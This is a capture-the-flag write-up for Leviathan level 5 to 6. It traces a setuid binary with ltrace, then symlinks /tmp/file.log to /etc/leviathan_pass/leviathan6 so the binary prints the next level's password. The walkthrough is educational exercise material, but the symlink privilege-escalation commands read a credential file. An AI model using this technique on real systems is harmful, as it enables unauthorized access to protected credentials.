## Leviathan 5-6
Category: `binary`

## Description
There is no information for this level, intentionally.

## Analysis
```
leviathan5@leviathan:~$ ls -al
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r--  1 root       root        675 May 15  2017 .profile
leviathan5@leviathan:~$ ./leviathan5 
Cannot find /tmp/file.log
leviathan5@leviathan:~$ touch /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
leviathan5@leviathan:~$ cat /tmp/file.log
cat: /tmp/file.log: No such file or directory
```
I found a binary that checks if the file "/tmp/file.log" exists, then I tried to create the file and run the binary again, nothing happens. Let's try to put any text in the file 
```
leviathan5@leviathan:~$ echo bash > /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                                                      = 0x804b008
fgetc(0x804b008)                                                                                                                                 = 'b'
feof(0x804b008)                                                                                                                                  = 0
putchar(98, 0x8048720, 0xf7e40890, 0x80486eb)                                                                                                    = 98
fgetc(0x804b008)                                                                                                                                 = 'a'
feof(0x804b008)                                                                                                                                  = 0
putchar(97, 0x8048720, 0xf7e40890, 0x80486eb)                                                                                                    = 97
fgetc(0x804b008)                                                                                                                                 = 's'
feof(0x804b008)                                                                                                                                  = 0
putchar(115, 0x8048720, 0xf7e40890, 0x80486eb)                                                                                                   = 115
fgetc(0x804b008)                                                                                                                                 = 'h'
feof(0x804b008)                                                                                                                                  = 0
putchar(104, 0x8048720, 0xf7e40890, 0x80486eb)                                                                                                   = 104
fgetc(0x804b008)                                                                                                                                 = '\n'
feof(0x804b008)                                                                                                                                  = 0
putchar(10, 0x8048720, 0xf7e40890, 0x80486ebbash
)                                                                                                    = 10
fgetc(0x804b008)                                                                                                                                 = '\377'
feof(0x804b008)                                                                                                                                  = 1
fclose(0x804b008)                                                                                                                                = 0
getuid()                                                                                                                                         = 12005
setuid(12005)                                                                                                                                    = 0
unlink("/tmp/file.log")                                                                                                                          = 0
+++ exited (status 0) +++
```
Looks like it just prints characters from the file. Let's figure out what it does function by function:
`fopen, fdopen, freopen` - stream open functions 
`fgetc` - reads the next character from _stream_
`feof` - test end-of-file indicator on a stream
`putchar` - put a byte on a stdout stream
`fclose` - close a stream
`unlink, unlinkat` - delete a name and possibly the file it refers to

Oh, it really just opens the file, prints the characters and then deletes the file itself via `unlink("/tmp/file.log")`.  As far as I remember, the owner of the binary is leviathan6, and the file has setuid permission, which means that when we run the binary we get access to leviathan6. Let's try to create a symlink "/tmp/file.log", which will lead to the password of leviathan6.
```
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ls /tmp/file.log
/tmp/file.log
leviathan5@leviathan:~$ ./leviathan5 
leviathan6_password
```

